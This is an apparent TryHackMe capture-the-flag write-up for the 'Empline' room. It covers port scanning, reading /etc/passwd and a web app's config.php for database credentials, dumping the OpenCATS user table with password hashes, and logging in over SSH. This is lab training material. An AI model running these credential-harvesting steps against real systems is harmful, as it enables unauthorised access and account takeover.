## Empline
https://tryhackme.com/room/empline

## Enum
```
nmap -Pn -sV 10.10.167.2 -vv

Scanning ip.thm (10.10.167.2) [1000 ports]
Discovered open port 80/tcp on 10.10.167.2
Discovered open port 22/tcp on 10.10.167.2
Discovered open port 3306/tcp on 10.10.167.2

Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
3306/tcp open  mysql   syn-ack ttl 61 MySQL 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
nmap -Pn -sV 10.10.167.2 -p- --min-rate 1000

Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
3306/tcp open  mysql   MySQL 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
```
🏴 I discoverd  3 open port.

![image](https://user-images.githubusercontent.com/6504854/188114931-747b64f5-4982-4844-b47a-e64c19f45922.png)
![image](https://user-images.githubusercontent.com/6504854/188115779-60bda2fd-3d75-45dc-8d78-5eafbb2ef841.png)
![image](https://user-images.githubusercontent.com/6504854/188116500-8db7b871-10f3-4eec-a64c-65f6ce0fb4df.png)

🏴 I missed this link and read writeups.😢 It always helps me, Thank you! 😉

```
echo '10.10.167.2 job.empline.thm' >> /etc/hosts
```

![image](https://user-images.githubusercontent.com/6504854/188121533-fb812c0d-26be-4650-834f-dc046b26829e.png)
![image](https://user-images.githubusercontent.com/6504854/188121638-5fd234c3-8abd-4d2e-8853-ffab085d0362.png)


![image](https://user-images.githubusercontent.com/6504854/188121907-2700d26b-5c62-4135-b36e-50de97027616.png)
![image](https://user-images.githubusercontent.com/6504854/188122045-58deb23e-1db9-4b53-90ad-8a792d992041.png)

🏴 Yatta! 🐱

## Flag
```
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
george:x:1002:1002::/home/george:/bin/bash
```

```
find /var/www -name *config* 2>/dev/null

/var/www/opencats/config.php
/var/www/opencats/vendor/behat/mink-extension/.git/config
/var/www/opencats/vendor/behat/behat/features/config_reference.feature
/var/www/opencats/vendor/behat/behat/features/config.feature
/var/www/opencats/vendor/behat/behat/features/locale_configuration.feature
/var/www/opencats/vendor/behat/behat/features/config_inheritance.feature
/var/www/opencats/vendor/symfony/config
/var/www/opencats/vendor/phpunit/phpunit/tests/TextUI/stop-on-warning-via-config.phpt
/var/www/opencats/vendor/phpunit/phpunit/tests/_files/configuration.colors.false.xml
/var/www/opencats/vendor/phpunit/phpunit/tests/_files/configuration_stop_on_warning.xml
/var/www/opencats/vendor/phpunit/phpunit/tests/_files/configuration.colors.invalid.xml
/var/www/opencats/vendor/phpunit/phpunit/tests/_files/configuration.custom-printer.xml
/var/www/opencats/vendor/phpunit/phpunit/tests/_files/configuration_xinclude.xml
/var/www/opencats/vendor/phpunit/phpunit/tests/_files/configuration_empty.xml
/var/www/opencats/vendor/phpunit/phpunit/tests/_files/configuration.colors.empty.xml
/var/www/opencats/vendor/phpunit/phpunit/tests/_files/configuration.xml
/var/www/opencats/vendor/phpunit/phpunit/tests/_files/configuration.colors.true.xml
/var/www/opencats/test/config.php
/var/www/opencats/optional-updates/latest-sphinx-search/config.php
/var/www/opencats/ckeditor/samples/toolbarconfigurator
/var/www/opencats/ckeditor/samples/toolbarconfigurator/font/config.json
/var/www/opencats/ckeditor/build-config.js
/var/www/opencats/ckeditor/config.js
/var/www/html/prepros-6.config
```
🏴 I could upload files to home directory but couldn't chmod +x so I tried to read some config files on www.

```
cat /var/www/opencats/config.php
```
![image](https://user-images.githubusercontent.com/6504854/188124417-9b4588ae-e498-45f8-9542-01513f42500b.png)

```
mysql -h 10.10.167.2 -u james -p
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 136
Server version: 10.1.48-MariaDB-0ubuntu0.18.04.1 Ubuntu 18.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
```

```
MariaDB [(none)]> show databases
    -> ;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| opencats           |
+--------------------+
2 rows in set (0.444 sec)

MariaDB [(none)]> use opencats;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

show tables;
Database changed
MariaDB [opencats]> show tables;
+--------------------------------------+
| Tables_in_opencats                   |
+--------------------------------------+
| access_level                         |
| user                                 |
| user_login                           |
+--------------------------------------+
54 rows in set (0.430 sec)

MariaDB [opencats]> select * from user;
+---------+---------+----------------+----------------------+----------------------------------+--------------+---------------------+--------------+---------------+------------+---------+------------+---------------------------------+---------------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------+-------+------------+------------+-------------+---------+-------+---------+------+-------+----------+---------+------------------+
| user_id | site_id | user_name      | email                | password                         | access_level | can_change_password | is_test_user | last_name     | first_name | is_demo | categories | session_cookie                  | pipeline_entries_per_page | column_preferences
+---------+---------+----------------+----------------------+----------------------------------+--------------+---------------------+--------------+---------------+------------+---------+------------+---------------------------------+---------------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------+-------+------------+------------+-------------+---------+-------+---------+------+-------+----------+---------+------------------+
|       1 |       1 | admin          | admin@testdomain.com | b67b5ecc5d8902ba59c65596e4c053ec |          500 |
      1 |            0 | Administrator | CATS       |       0 | NULL       | CATS=bfkli2vopigogda9sph95k3mo6 |
|    1250 |     180 | cats@rootadmin | 0                    | cantlogin                        |            0 |
      0 |            0 | Automated     | CATS       |       0 | NULL       | NULL                            |
|    1251 |       1 | george         |                      | 86****************************ac |          400 |
      1 |            0 | Tasa          | George     |       0 | NULL       | NULL                            |
|    1252 |       1 | james          |                      | e53***************************c9 |          200 |
      1 |            0 | Gynja         | James      |       0 | NULL       | NULL                            |
+---------+---------+----------------+----------------------+----------------------------------+--------------+---------------------+--------------+---------------+------------+---------+------------+---------------------------------+---------------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------+-------+------------+------------+-------------+---------+-------+---------+------+-------+----------+---------+------------------+
4 rows in set (0.435 sec)
```

![image](https://user-images.githubusercontent.com/6504854/188126871-20c7180e-abff-4754-bf62-7d2c5ff1a14d.png)

```
ssh george@ip.thm
```

![image](https://user-images.githubusercontent.com/6504854/188127517-5d8e1064-dba2-4832-a808-9fac710c1473.png)

Thank you for your time! Happy Hacking 😄

リンクの取りこぼしをなくさねばー。全部Grepして確認するか、BurpのExtentionさがすかー。今日金曜日だったか。。。


